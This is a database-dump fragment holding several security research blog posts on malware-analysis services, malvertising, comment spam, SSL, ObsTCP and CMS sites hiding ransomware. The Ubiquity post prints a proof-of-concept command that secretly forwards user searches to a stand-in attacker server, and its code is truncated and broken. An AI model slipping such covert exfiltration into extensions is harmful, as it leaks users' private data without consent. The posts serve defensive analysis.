guaranteed to prevent infection.  	A server side compromise is often the first step in a client side attack.  	Defense in depth is critical. In this situation, the threat can be mitigated by patch management, network and host based AV and blocking malicious URLs.

Analyzing malware to protect against it and repair the damage that it may have done, is a significant part of the job description for many security professionals. The sheer volume of malware can make dealing with it an overwhelming task. Fortunately, a number of free cloud-based services have emerged to aid in the task of analyzing malware.    I\'ll divide the analysis tools into two categories - Anti-Virus Multi-Scanners and Sandboxes. The former is nothing more than a collection of AV scanners designed to run together analyzing the same file and return the different results for each AV vendor. This can be a very valuable starting point. It is frustrating to spend hours or days conducting deep analysis on a new binary only to find out that AV vendors have already analyzed the same file previously. A quick run through a multi-scanner can help to let you know if you\'re dealing with 0day or yesterday\'s news. Sandboxes on the other hand are emulation environments which perform automated behavioral analysis on a binary file. They allow the binary to execute and emulate the services that it attempts to interact with. Meanwhile, they are recording the activity which is occurring such as file reads/writes, registry access and network traffic.    AV Multi-Scanners    Building your own multi-scanner isn\'t a terribly difficult or expensive challenge. You need to obtain AV SDKs or command line tools from various vendors, develop a wrapper/front-end to simultaneously submit the same malicious code samples to all at the same time and parse/combine the results into a meaningful report. While it may be valuable to put in the effort if you expect to feed a heavy and regular volume of binaries into the multi-scanner, say for a honeypot network, there are free online alternatives if you\'re looking for only occasional analysis. Below is a chart comparing the functionality of a couple of popular (and free) multi-scanners.                        	  		  			   			VirusTotal  			VirScan.org  		  		  			No. of Engines  			34  			39  		  		  			Zip support  			No  			Yes  		  		  			Web Submissions  			Yes  			Yes  		  		  			Email Submissions  			Yes  			No  		  		  			SSL Support  			Yes  			No  		  	          Sandboxes    Sandboxes automate the process of behavioral analysis. They permit a binary to execute in a controlled environment and monitor the activity which occurs. Given that we\'re dealing with malicious code, the binaries will generally attempt to spread, often by scanning for vulnerable hosts. Rather than actually permit malware to spread externally, sandboxes can simulate network responses to allow the binary to continue executing without actually permitting third party infection. If a steady volume of analysis is required you\'ll want to consider commercial products such as those offered by Norman and Sunbelt Software, however, such solutions can be expensive. If you only require periodic analysis, both vendors offer free web based access to their platforms. Anubis, by contrast, is purely a free web based service and does not have a commercial product offering. The chart below compares the functionality of these three cloud based sandboxes:                             	  		  			   			Anubis  			Norman Sandbox  			CWSandbox  		  		  			URL Analysis  			Yes  			No  			No  		  		  			Zip Support  			Yes  			No  			No  		  		  			SSL Support  			Yes  			No  			No  		  		  			Email Results  			Yes  			Yes  			Yes  		  		  			Dependent Binaries  			Yes  			No  			No  		  	          As can be seen, for an entirely free service, Anubis has an impressive feature set. They even encourage the automated of binaries for analysis so the platform can even be integrated into a honeypot network.    It\'s great to see free resources emerging for malware analysis. As mentioned, these free services won\'t meet everyone\'s needs, but if you\'re tasked with securing a network and only occasionally need analysis capabilities, these sites can significantly streamline your efforts.    - michael', 'Analysis', 'https://www.zscaler.com/blogs/research/cloud-services-analyzing-malware');

I thought I\'d take a moment to discuss a real-life security incident that I recently reviewed in post-mortem fashion. The plot is simple: while the person was surfing the web, their browser was exploited by a piece of malware targeting a popular browser plugin. However, it\'s the details that make this story a bit intriguing...and scary.\r\n\r\nThe person\'s surfing session was quite normal and not particularly careless. During the moments just before the incident, the person was using Google to find an answer to a technical question. One of the top search results was for a smaller site that hosted technical tidbits of information collected and donated from various information sources. The person clicked through to that site. Now, this site is not a site that would be considered to have a \'risky\' reputation, nor does it harbor any direct malware. It\'s just a normal, basic site that looks to be someone\'s personal project (site was designed in FrontPage 6.0!) to better the world by collecting and publishing useful information. In fact, the only thing questionable about it is the number of syndicated ads on the page: 7, by our count, from multiple vendors (BidVertiser, Google, Clicksor, and FastClick). Of course, it makes sense that they would (over-)populate their page(s) with ads in an attempt to generate revenue from their content publishing efforts. But this turned out to be the problem.\r\n\r\nSee, once the person\'s browser landed on this ad-infested page, the browser started running around like mad to fetch all the syndicated ad content. Each ad syndication attempt usually results in multiple browser requests because the main requests to the ad syndicator often results in a chain of redirects eventually landing at the specific content of the \"advertisee\" utilizing the syndication service. As the term \'syndication\' implies, the ad services are just the middle-man between the web site and the advertisee. And the website is just the middle-man between the ad service and the web surfer.\r\n\r\nAnyways, what eventually happened is that one of the ad syndicators served up an advertisee\'s ad...and it just so happened that the ad was actually a piece of malware that could immediately compromise the vulnerable browser plugin. This is not necessarily new news; attackers have been known for quite a while to leverage advertising syndication as a way to spread their malware. But it\'s a bit scary to witness in action, and the growing amount of advertising syndication utilized by web sites is going to make it a more predominant malware delivery vector. The problem is exacerbated by the fact that the ads are no longer simple graphics; advertising syndicators usually allow their clients (the advertisees) to specify arbitrary HTML. This gives the advertisee cart blanche to use rich media ads that rely on multiple technologies such as DHTML, Javascript, Flash, etc. But this also gives an attacker full access to syndicate any arbitrary piece of malware that could be hosted/served via a normal web page. (Side note: maybe Google is onto something by only using pure text-based ads; the text is very easy to validate and stands practically no chance of harboring a piece of malware...)\r\n\r\nWhat does this all mean? Well, there are a few things. First, all of those vendors who suggest an exploit is partially mitigated by the requirement that a \"user must visit a malicious web page in order to be attacked\" need to change their tune, because advertising syndication is essentially bringing the malicious web pages (via rich media ad capabilities) to the user. Second, the onus is on the advertising syndication services to ensure their clients aren\'t trying to deliver malware ads through the service. That\'s a tall order, and the ad vendors have not exactly been batting 1000. Third, in the age of mashups and syndication, we no longer have a situation where a user has to only decide whether they trust the destination web site or not; they must now trust all the components that are mashed and syndicated into that site, and in turn trust all the components those components use, etc. In the incident I just talked about, we have the person trusting the web site, the web site trusting the advertising services, and the advertising services trusting their clients. Thus we come to having trust two times removed. Worse, web browser do not equip people with the necessary tools to really help them manage this trust chain effectively; it\'s pretty much an all-or-nothing shot based upon the user\'s trust of the immediate target web site. In the meantime, maybe browser plugins like AdBlockPlus and NoScript could help, although that essentially robs legitimate sites of advertising revenue. However, if enough users start to use ad blocking software as a matter of security, perhaps the advertising services will become pickier about their clientele and better scrutinize what they are actually syndicating.\r\n\r\nOnly time will tell, I suppose.\r\n- Jeff\r\n\r\nps. if you are interested in which advertising vendor was the \'enabler\' for the mentioned incident, well, we can not say with 100% certainity. But there does seem to be a popular opinion against one of the vendors.', 'Malware', 'https://www.zscaler.com/blogs/research/trust-two-times-removed');

I run a couple of personal web sites that host the usual gamut of material found on personal web sites (pictures of my kids and family, my latest favorite LOLcat graphic, etc.). Recently I updated one of my sites and added a new comment/contact submission form so I wouldn’t have to expose my email address for spam harvesters to find. A mere few hours after enabling this new comment submission form on my web server, I started to get some comments; unfortunately they were all comment spam.    Of course, web comment spamming has become yet another fact of life on the Internet. Blogs and forums with unmoderated/open comment submission functionality are quickly getting clogged with random and off-topic spam. Basically the spammers are taking the content they would normally send you in email, and now posting it to web site forums and blogs too. This is why comment moderation and CAPTCHAs are becoming the norm for forum and blog comment posting.    Anyways, there is nothing all that exciting about receiving spam of any variety. However the nature of the comment spam I received caught my eye. Over the course of a few weeks, I received multiple comment spams that all had the same format, but different random values.    Two examples of the comment spam I received were:    Email: cdbiib@orhabg.com  Comment:  jJsAdx <a href=\"http://aereogakjvpd.com/\">aereogakjvpd</a>, [url=http://ubfcdpkfggto.com/]ubfcdpkfggto[/url], [link=http://wiogiusmvjcz.com/]wiogiusmvjcz[/link], http://ejmugotxbmqc.com/      Email: thowea@snkkjo.com  Comment:  fHwI3w <a href=\"http://uwtsayqpclib.com/\">uwtsayqpclib</a>, [url=http://wetpnicpwkfd.com/]wetpnicpwkfd[/url], [link=http://bvtyjneqigek.com/]bvtyjneqigek[/link], http://prcghesjscpl.com/    We can make an educated guess that this comment submission isn’t directly about blindly shoving links onto sites in order to bolster incoming link counts (inflating PageRank ratings and aiding in SEO efforts), because all the links are random and don’t reference real sites. There is no practical value in the data itself that was submitted, except as acting as a probe to see what comes out the other side of the submission process. The data contains four different link formats (an actual HTML <A> tag, two flavors of popular bulletin board markup tags, and just a raw URL), and perhaps a fifth if you count the email address too. That makes me believe the end goal was probably to find a way to inject a clickable link of some sort. Had the action been successful, perhaps the same software would have then subsequently tried to inject more meaningful links (back to our SEO theory). Or, perhaps this was just a pre-cursor scouting application compiling a list of URLs known to allow arbitrary link injection (such lists would commonly be paired or sold with spamware/crimeware apps used to inject content onto listed sites already known to be open to receiving the injection).    Of course, being the curious individual that I am, I started to wonder:      	The app managed to put something resembling an email address into the email field. Now, sure, the form field name was ‘email’, so it wouldn’t be that hard to deduce; what would happen if I named that field something less obvious (\'mail\', \'eml\', \'e\', \'foo\')?  	The links were submitted in a textarea field; will it submit the same type of data in a more constrained input text box?  	Will it try to inject content into other identifiably named fields, such as \'phone\', \'address\', \'url\', etc.?  	Does the app support cookies? Is it a well-behaved web user agent? How smart is it?  	Can the app\'s injection logic handle multi-step submissions, where you submit to one page/place and the data eventually appears on a different page/place but not within the actual submission response (think: you submit a comment, you get a page that says \"thank you\", but then have to click one more link before you get to where your comment is actually displayed)?  	And of course, the million dollar question: what would have happened had their injection succeeded and produced a clickable link?      I’m not one to leave such important questions burning on my mind (heh), so I came up with a plan to get the answers I want. I will lay a trap for the comment spammer (or rather, their app). The idea is simple: through the magic of some server-side logic, I will detect when this comment spamming app is making submissions to my forms (assuming they come back in the future; but historically they seem to visit me on a fairly regular basis, so it seems a safe assumption). Rather than display the usual \"thank you for your submission\" response, I’ll instead feed a specially crafted response to make it seem like the submission actually produced a clickable link (making me look vulnerable). Further, I will then flag that session/IP as a spammer, and all subsequent requests will result in some extra forms being added to the web page responses. Those forms will be designed with certain characteristics meant to gauge the effectiveness and operation of the application and its web crawler; I’m assuming the app will repeat its typical injection testing process for as many forms as it encounters.    So if all goes accordingly to plan, I intend to post a follow-up to this aptly titled article in a few weeks.

This is their fourth such annual report and while the overall findings were unsurprising, it highlights a growing problem - how to control application use as traffic converges on ports 80 and 443. The survey found that employee use of collaborative Internet applications is on the rise and that employees use such applications for personal benefit on company time - no surprise there. This has in turn led to security, bandwidth utilization, compliance and data leakage issues. Some of the more interesting findings are below:      	97% of employees utilize \'Internet Applications\', defined as IM, P2P, streaming media, collaboration (web conferencing, blogging and social media), VoIP, anonymizers, web mail, etc.  	86% use IM  	54% use file sharing  	69% use VoIP  	15% use anonymizers      These statistics are important as they emphasize the increased use of applications that are often not sanctioned or monitored by internal IT, yet can significantly impact the corporate LAN. The larger the attack surface, the more vulnerable a platform becomes. Installing additional applications to a desktop system increases the likelihood that one such application will be vulnerable and open to attack, especially when these applications are not regularly patched. Moreover, such apps can represent costly bandwidth utilization and potential data leakage risk.    Why is it that the use of non-sanctioned applications is on the rise? Have internal security teams given up the fight and handed over desktop control to end users? No. The reality is that end users no longer need admin rights to utilize alternate applications. Why? Many are now web based. You don\'t need to install a desktop application on your machine, you only need to point your web browser to a Rich Internet Application and any of the aforementioned application categories are readily available online.    What the report did not cover, is what form this traffic takes, how it can be identified and how it can be controlled. A decade ago, network firewalls ruled the security landscape. Preventing access to a particular application/protocol was as simple as blocking a known port. Don\'t want employees to send files? No problem, block outbound port 21. Telnet? That\'s port 23. Today however, ports are meaningless. Traffic is converging on ports 80 and 443 for a simple reason - they\'re always accessible, on any network.    Applications are becoming \'network aware\'. They may have a preference for their communication protocol but they will find a way out and their fallback plan is always the web. Take a look at applications such as Skype, Tor or virtually any modern P2P application. If you bock all other means of egress, you will find traffic being tunneled through port 80. When this occurs, ports become meaningless and sysadmins suddenly have their hands full. Today, security solutions designed to hand control back to administrators must understand the language spoken by applications in order to pick it out within the sea of legitimate web traffic. Moreover, vendors must constantly monitor and update their signatures as the traffic patterns are continually changing in order to bypass known controls. Just as we\'ve accepted the arms race between virus writers and AV vendors, we now have an arms race between those seeking to make applications accessible to all and the enterprises seeking to control them.    - michael', 'Analysis', 'https://www.zscaler.com/blogs/research/ports-are-meaningless');

I recently stumbled across one such project from Mozilla Labs, known as Ubiquity. The project is described as \"an experiment into connecting the Web with language\". In a nutshell, it is an Firefox extension which extends browser functionality via natural language queries. When a user invokes Ubiquity via a keyboard shortcut, a text box is displayed where the user can input simple queries and the requests/responses can interact directly with the browser. Let\'s look at an example:\r\n\r\nAccess Ubiquity - On my Mac, by default this can be done via Alt-Space\r\n\r\nEnter a command - I type \"map 1600 Pennsylvania Avenue, Washington DC\" as seen in the image to the left. Note that in addition to retrieving a map, in the lower right hand corner of the image there is an \'Insert map in page\' link. Clicking on this will automagically embed an the map into an editable section of the page that you\'re on. This is handy, for example, for embedding maps into webmail messages.\r\n\r\nBig deal. Google Maps has been around for years. Why should I care that a plugin has been built to make it easier to look up maps?\r\n\r\nWhy Ubiquity Changes the Security Landscape\r\n\r\nExtensibility - Anyone can develop Ubiquity commands and it\'s easy to do so. Once a new command has been created, you can deploy it simply by linking to the code on a web page. The Ubiquity extension will recognize the code and prompt users to add the new command. As the Ubiquity user base grows, this certainly streamlines social engineering attacks. While such extensibility is similar to what can be done today with browser extensions, Ubiquity commands can be developed much more quickly and are just as powerful.\r\n\r\nInteraction - The Ubiquity query window isn\'t just a new browser window. Commands have the ability to directly interact with your browser. For example, the built in email command, interacts with your Gmail account (assuming you\'re authenticated) and allows you to query email addresses from your contacts. This is certainly handy and allows for great interactive Ubiquity commands to be built, but could certainly be abused. How about a rogue Ubiquity command which unknowingly forwards your contact list to a spam bot?\r\n\r\nRemote Updates - The authors of new commands can make changes on the fly and the next time the command is called, Ubiquity will use the updated logic. End users do have the ability to accept automatic updates when they first subscribe, but assuming they do, this provides a great Trojan Horse for a less than honest author. They could publish a useful command, wait until it\'s widely deployed and then change the logic. Take for example the evil-search function which I\'ve published, the code for which is below:\r\n\r\nCmdUtils.CreateCommand({\r\nname: \"evil-search\",\r\ndescription: \"Searches Yahoo! (...and let\'s me know what you search for...)\",\r\nhelp: \"Try issuing \"evil aglet\"\",\r\nicon: \"http://www.yahoo.com/favicon.ico\",\r\ntakes: {\"word\": noun_arb_text},\r\nexecute: function( directObj ) {\r\nvar word = directObj.text;\r\nUtils.openUrlInBrowser( \"http://search.yahoo.com/search?p=\" + escape(word) );\r\nUtils.ajaxGet( \"http://localhost/search?p=\" + escape(word) );\r\n},\r\npreview: function( pblock, directObj ) {\r\nvar word = directObj.text;\r\nif (word.length < innerhtml = \"Searches Yahoo! for the provided search term (...and let\'s me know what you search for...).\">\r\n\r\nThis simple Ubiquity command integrates Yahoo! search functionality. When used, the user will be redirected to a web page displaying results for their query. However, behind the scenes, a second AJAX query is made to an attacker controlled server (left as localhost for illustrative purposes). To see this in action, subscribe to the command, run an evil-search query and check the log files on your local server. A command such as this could be used to keep tabs on searches queried by other users. This is a very simple example. With the power offered by Ubiquity, the sky\'s the limit.\r\n\r\nChallenges/Solutions\r\n\r\nTo be fair, this is a beta project and the team fully admits that security issues will need to be addressed. That said, at present they appear to be pursuing two paths to address the security implications.\r\n \r\n\r\n\r\n  ​End User Warnings - When subscribing to a new Ubiquity command, the user is presented with a big, bold warning letting them know (literally) that evil commands could do anything that they want, including steal credit card information. Warnings such as this are in my opinion, useless (I\'m talkin\' to you Vista). Relying on end users to determine is something is safe doesn\'t work as most users don\'t have the skills to make that determination.\r\n\r\n\r\n \r\n\r\nSocial Trust Network - The current Ubiquity warning message indicates a plan to create a Social Trust Network, whereby users will rely others to determine if a command is safe. This doesn\'t fix the problem, it just spreads it out. The approach still relies on users to determine if a feature is safe and given the remote update capabilities of Ubiquity commands, just because a million people agree that a command is safe today, it could be evil tomorrow. If anything, such a network could provide a false sense of security.\r\n\r\nIn my opinion, the only viable way to secure such a system is to inject a review process. Yes, this reduces the openness of the project and yes this isn\'t foolproof but people with security expertise and knowledge of Ubiquity need to be involved and that puts the burden squarely on the shoulders of Mozilla. I liken it to malicious Google gadgets, which Google claims to test for vulnerabilities. In a world of mashup technologies, where functionality, not just content, can be created by anyone, a central authority must take responsibility for protecting end users.\r\n\r\nUbiquity is a great project and I hope that it succeeds. I just hope that better security is implemented before this project goes prime time.\r\n\r\n- michael', 'Analysis', 'https://www.zscaler.com/blogs/research/ubiquity-foreshadows-future-browser-security-challenges');

In my last post I talked about the desire of some folks to use SSL for encryption purposes but forego the authentication components (via the use of self-signed SSL certificates). Overall it’s not a very good idea, since removing authentication from the process renders the benefit of the encryption moot for all but the most trivial (and lazy) threat vectors (passive eavesdropping).  So earlier this week I ran across a mention of the Obfuscated TCP project (a.k.a. ObsTCP), developed by Adam Langley of Google. The project is self-described as:  Obfuscated TCP is a transport layer protocol that adds opportunistic encryption. It\'s designed to hamper and detect large-scale wiretapping and corruption of TCP traffic on the Internet.  This sounds like an ideal potential alternate for all of those who wish for an \'encryption without (expensive public CA certificate-based) authentication\' solution. The ObsTCP idea is simple: use light-weight and fast encryption functions to obfuscate all TCP data streams, in an effort to thwart passive eavesdropping. Processors are fast enough these days that the additional overhead to perform the data obfuscation is negligible. And (from my interpretation of the project’s documentation), the idea isn’t to be cryptographically secure transport and/or replace SSL…it’s just to obfuscate TCP data enough to make passive eavesdropping difficult to do. We are already seeing similar approaches deployed via P2P clients to bypass ISP-based throttling based on packet/protocol inspection; the obfuscation employed isn’t robust to survive a targeted cryptographic attack, but it is enough to make high-speed protocol detection and classification difficult. The project has produced a video (hosted on Youtube) that goes over the basic goals and reasoning behind them.  Looking at the project\'s history, the original intent seems to be for ObsTCP to be added into the TCP/IP protocol stack (ISO layer 4) for transparency. However, apparently the ObsTCP project approached the IETF with a draft, and, ... well ..., it got a chilly reception. So ObsTCP changed gears and instead moved up the stack to the application layer (ISO layer 7), and is now focusing on HTTP as their first high-value protocol target. So the original project description of ObsTCP being a \"transport layer protocol\" is a bit misleading when considered in the context of the project\'s new implementation direction.  So how does ObsTCP work? Well, it requires an ObsTCP-capable client and server. The server admin essentially embeds the server\'s public key (and some meta information) in a DNS entry related to the server. The client retrieves the server\'s public key, opens a connection to the ObsTCP port of the server, and then uses a Diffie-Helman authentication exchange to negotiate a key to use for subsequent encryption. Right now the project is offering proof-of-concept patches for Firefox browser, and Apache and lighttpd web servers to make them ObsTCP-capable. They also offer an ObsTCP-to-normal-TCP proxy which can be placed in front of TCP services to make them ObsTCP-capable.  Overall, how does ObsTCP compare against the threat vectors previously listed in my \"SSL encryption without authentication debate\" post? We already mentioned that passive eavesdropping would be thwarted, as that\'s the purpose of ObsTCP to begin with. But what about a more active man-in-the-middle (MitM) attack? My cursory review of the ObsTCP documentation and design indicates that it does not directly mitigate that specific threat vector—however, it does make it harder for an attacker to pull off. This is because the server\'s public key is distributed via DNS, separate from the TCP connection. That means an attacker has to intercept both DNS request and the TCP connection in order to successfully pull of a MitM attack. Further, the DNS records can be cached at various points around the Internet, making it further difficult for the attacker to spoof a DNS response. The attacker would likely have to employ separate specific DNS attacks (such as the recent Kaminsky brouhaha) just to inject the right info into DNS in order for the TCP intercept/MitM to correctly work. The amount of effort and coordination to pull this off is far greater than a single TCP intercept/MitM attack by itself.  Overall the ObsTCP project is in alpha stages, but the idea is intriguing. It does seem to fill a need that is growing and becoming more vocalized (i.e. encryption without authentication). It will be interesting to see whether the project becomes adopted enough to start gaining public traction and attention. We figure it will be the usual circular catch-22 situation often encountered with new Internet technology: server admins forego deploying the technology because not enough clients support it, and clients forego implementing the technology because not enough servers support it. Oh well, it’s still a good idea.  - Jeff', 'Data Breach;Encryption', 'https://www.zscaler.com/blogs/research/obfuscated-tcp-project');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (620, 'The ‘SSL Encryption Without Authentication’ Debate', 'ThreatLabz', 'October 03, 2008', 'Every so often I encounter a debate where an individual is making a case for the value of supporting/accepting self-signed SSL certificates in browsers. Basically their argument is “I do not care about authentication of SSL, I just want the encryption part…so why should I have to pay VeriSign or another commercial CA all that money for an SSL certificate that verifies my identity?” This question seems to be newly fueled by the fact that Firefox 3 now requires the user to go through a laborious 4-step process to allow the browser to connect to an SSL site utilizing a self-signed certificate.\r\n\r\nThe problem is: anyone who asks the above question is ignoring how SSL works and how SSL employs encryption in the first place. If you are trying to keep an evil person from learning your secrets, but you do not authenticate who you are talking to, you are basically overlooking that you may well be telling your secrets to the evil person directly! If you don’t authenticate the identity of someone, they are essentially an unidentified stranger to you. And the idea of wanting to keep your secrets from strangers (i.e. encryption) but also be willing to give your secrets to strangers (i.e. no authentication) is contradictory. If you have no idea of who you are talking to, then what value is the encryption really providing? How do you tell a complete stranger a secret in private and still expect the secret to remain safe from strangers?\r\n\r\nLet’s look at how SSL tackles authentication via the use of certificates. A signed (i.e. authenticated) certificate is essentially a digital record that says “My name is Bob, and this big trusted company over here agrees with that statement.” The idea is that browsers trust a set of big trusted companies (Certificate Authorities such as VeriSign, Thawte, etc.), and that creates a trust chain: we trust the browser, the browser trusts the CA, the CA says this is Bob, so we trust it is Bob. On the other hand, a self-signed (i.e. non-authenticated) certificate is a digital record that says “My name is Bob, and you will just have to trust me that what I am saying is true.” It’s almost like the honor-system approach of everyone stating who they are; but how do we know if they are lying? Essentially, you don’t…because self-signed certificates can be created by anyone to say anything (that is the whole purpose of self-signed certificates). An evil attacker can trivially generate certificates that say “My name is Paypal, and you will just have to trust me,” “My name is eBay, and you will just have to trust me,” “My name is Bank of America, and you will just have to trust me,” etc. The only thing that prevents the attacker from deceiving you with these malicious self-signed certificates is your browser’s better judgment of not trusting these arbitrarily fabricated declarations of identity having no proof. Remember: security is about keeping you safe despite lies and deception; we need to ensure that a simple lie by an attacker won’t compromise the entire process. In this case, self-signed certificates offer a way for attackers to lie about their identity with impunity.\r\n\r\nSo let’s go back to the original premise of the question and look a bit more technically at what’s going on. The argument is the desire to have encryption without authentication. That means the sensitivity and secrecy of the data is still an issue/desire, otherwise, why bother with encryption? The primary threat vector mitigated by end-to-end encryption on a network is passive eavesdropping (a.k.a. network sniffing). But keep in mind that, in SSL, the encryption keys are dynamically negotiated by the two endpoints at the start of the connection (after authentication has concluded). Thus encryption by itself offers no security value if the passive eavesdropping attacker decides to switch to an active man-in-the-middle or interception attack (which is technically viable if they were already in a position to eavesdrop your network traffic to begin with); this just means you are now negotiating an encryption key with the attacker and directly sending them your data. SSL normally mitigates these attacks by the use of authentication, to ensure the endpoint you negotiate your encryption key with is indeed who they say they are. However if we allow self-signed certificates to be used and therefore overlook the authentication aspect, there is zero guarantee that the person you just negotiated an encryption tunnel with isn’t the person you were trying to secure your information from (via encryption) in the first place. True, it does require the attacker to switch from a passive attack to an active attack, but that is of little consequence if the attacker truly wants to compromise the data. And attackers are already playing very active roles in attacks today (setting up an entire phishing site and sending out phishing emails isn’t exactly a passive affair…).\r\n\r\nI have a hunch the real motive behind petitioning for self-signed certificate support is purely economic. Web site operators want to appear to conform to user expectations of security and privacy via the use of SSL (the whole “make sure the little lock icon appears in your browser before you send sensitive info” mantra), but without having to shell out cash for a real SSL certificate (if they just paid the money for a proper CA-signed certificate, this whole debate is moot). It’s the façade of security without actually delivering on the promise. But those that are using self-signed SSL certificates for production uses, even prior to the newer crop of browsers handling them less favorably, are already doing a slight injustice to security as whole—because they are forcing a user to essentially make a “Yes I know this is insecure, please proceed anyways” decision. Accepting self-signed certificates in older browsers is usually just a semi-scary dialogue followed by a one-click override from the user….and apparently the protagonists of this debate believe this (was) acceptable for users to do. But isn’t that just exacerbating the phenomenon of users continually making bad security choices, by explicitly encouraging them to do so? We should not be encouraging users to bypass or override security protection mechanisms put there for their own good; what starts as an encouraged exception may eventually become an assumed norm (I’d like to make a Pavlov reference here, but I don’t want it seen as belittling the behavior or intelligence of users).\r\n\r\nAll of that said, I suppose there are some certain approaches that may offer a balanced compromise. If we look at SSH, we encounter the same basic problem: when the client first connects to the server, it doesn’t know if the server is actually the right server or not. So usually the client prompts the user with a small fingerprint of the server’s identity in order to verify that identity out-of-band. If the user instructs the client to proceed, the client caches the server’s identity fingerprint. From that point on, as long as the server’s identity fingerprint matches what is cached, life is good. If that identity fingerprint ever changes, then lots of security bells and whistles go off because something is afoot, such as a man-in-the-middle attack (or the server admin re-generated their identity information, which is not something done arbitrarily). Basically it reduces the “no-authentication” scenario down to only the very first, initial connection that the client makes to the server. An attacker would have one chance—and one chance only—to intercept that very first connection and supply impersonated credentials. But also keep in mind, if the attacker stops the interception ruse and allows the connections to proceed to the proper server, the client will immediately alert the user to something fishy because the server identity (as seen by the client) has changed. So an attacker can remain undetected if and only if they intercept that very first connection, and only for as long as they actively and continually intercept all future connections. That reduces the chance of successful attack to a very small window, and requires moderate effort on part of the attacker to remain undetected. Perhaps this approach could be adapted to browsers, where a self-signed certificate for a given site can be manually verified once (the first time), and then cached so that as long as the certificate doesn’t change, it can be assumed to be the same site. It is entirely a change to the client browser and how SSL certificates are validated; no SSL protocol or server-side changes are necessary.\r\n\r\nBut unless browsers were to enact such a change, the use of self-signed certificates in this day in age is a risky proposition. They are fine for testing purposes, but they should never be used in production with real users. An alternate approach to using self-signed certificates is to create your own CA (you can use the free OpenSSL suite to do so) and use your CA to sign your server certificates; then encourage your users to install your CA certificate. This at least maintains the integrity and security value of the SSL protocol, and would allow the users\' browsers to function without any security warnings requiring user interaction. However, you must then guard your CA private keys thoroughly, as you have now because a trusted entity in the browser’s eyes; if your CA keys are stolen, it would allow attackers to generate arbitrary certificates that are signed by your CA. In other words, the attacker could create the equivalent of arbitrary self-signed certificates but would actually use you as the trusted signing authority, and since the users’ browsers now trust your CA, the browsers would inherently trust all of the attacker’s certificates.\r\n\r\nRegardless of what you do, one thing is for certain: you do not want to be the weakest link in the security chain. SSL literally has a trust chain established by the use of authentication certificates, and trying to bypass authentication (and the associated trust chain) compromises all security (including encryption) offered by SSL. No one likes being identified as the weakest link, so save your company the PR trouble and just buy that SSL certificate from a proper CA. It’s what is best for everyone involved, and your wallet will recover.\r\n\r\n- Jeff', 'Encryption', 'https://www.zscaler.com/blogs/research/ssl-encryption-without-authentication-debate');

We have seen a handful of fundamental shifts in computing over the decades and I firmly believe that cloud computing represents a major evolution in information technology and that the evolution has only just begun. For proof of this, Google the term \'cloud computing\' and see just how many news hits result. As I write this, the number is north of 4,000 and a quick scan of the headlines is like a drive through Silicon Valley - the usual suspects are everywhere. Sounds like a quick, steep climb up the hype cycle to me. The question for me is not will cloud computing stick around, but rather how quickly will it be adopted and more specifically, how must security services adapt to accommodate this paradigm shift?    Some industries have quickly adopted cloud computing while others have moved more cautiously. Google is of course a pioneer in the space, having invested heavily in the belief that the day will come when storing data in the cloud will be the de facto standard. So far their gamble seems to be paying off. Gmail (despite eternal beta status) has gone from being an interesting Hotmail competitor, to the email infrastructure leveraged by enterprises, big and small. Even Google Docs shows promise. I\'ve gone from being a skeptic to appreciating the collaborative power of hosting apps online, especially in a world where employees are commonly separated by geography.    Privacy concerns present a challenge that must be overcome for cloud computing to enjoy broad adoption and rapid growth. That barrier is however coming down quickly. There was a time when companies wouldn\'t have considered housing sensitive sales data anywhere other than on the corporate LAN and today Salesforce is one of the true success stories of the cloud computing era. Reliability is the second critical challenge which must be tackled and when major players such as Google or Amazon have outages, no matter how brief, it makes headlines. This challenge however, will be solved too. When customers demand reliability and money is on the line, there is no shortage of incentive to solve such problems and solve them quickly.    So where does this leave security services? My bias is obvious and I won\'t hide it. I believe that security services are destined to shift from products to services. Security is a necessary evil. Banks don\'t hire hoards of security experts because they want to, they do so because they have to. If a reliable service were in place, which could provide an equivalent or better level of security at a lower TCO, would enterprises adopt it? I think so. While to date few such services have existed, the acceptance and adoption of cloud computing in other industries will continue to facilitate the adoption of security services in the cloud as well. The challenges will be similar for the security industry - privacy and reliability, with special emphasis on the former. The challenge is real and it has arrived. It\'s now up to us to solve it.    - michael', 'Cloud', 'https://www.zscaler.com/blogs/research/cloud-cover');

They have also become popular for malicious actors, as cybercriminals target sites on these platforms for hacking and injecting malicious content. During the past few weeks, ThreatLabZ researchers have detected several WordPress and Joomla sites that were serving Shade/Troldesh ransomware, backdoors, redirectors, and a variety of phishing pages. The most well-known threats to CMS sites are the result of vulnerabilities introduced by plugins, themes, and extensions.    In this blog, we are focusing on the Shade/Troldesh ransomware and phishing pages that we detected last month from several hundred compromised CMS sites. Shade ransomware has been quite active in the wild and we have been seeing a number of compromised WordPress and Joomla sites being used to spread the ransomware.    The compromised WordPress sites we have seen are using versions 4.8.9 to 5.1.1 and they use SSL certificates issued by Automatic Certificate Management Environment (ACME)-driven certificate authorities, such as Let’s Encrypt, GlobalSign, cPanel, and DigiCert, among others. These compromised WordPress sites may have outdated CMS plugins/themes or server-side software which potentially could also be the reason for the compromise.        Fig 1: Hits of Shade and phishing in detected CMS sites    During the past month, our cloud blocked transactions for compromised WordPress and Joomla due to Shade ransomware payloads (13.6 percent) and phishing pages (27.6 percent), with the remaining blocks due to coinminers, adware, and malicious redirectors.    We have been monitoring the compromised HTTPS sites for a few weeks and have noticed that attackers are favoring a well-known hidden directory present on the HTTPS website for storing and distributing Shade ransomware and phishing pages.    The hidden /.well-known/ directory in a website is a URI prefix for well-known locations defined by IETF and commonly used to demonstrate ownership of a domain. The administrators of HTTPS websites that use ACME to manage SSL certificates place a unique token inside the /.well-known/acme-challenge/ or /.well-known/pki-validation/ directories to show the certificate authority (CA) that they control the domain. The CA will send them specific code for an HTML page that must be located in this particular directory. The CA will then scan for this code to validate the domain.    The attackers use these locations to hide malware and phishing pages from the administrators. The tactic is effective because this directory is already present on most HTTPS sites and is hidden, which increases the life of the malicious/phishing content on the compromised site.    The different types of threats that we found under the hidden directory in the past month are shown in the below image.
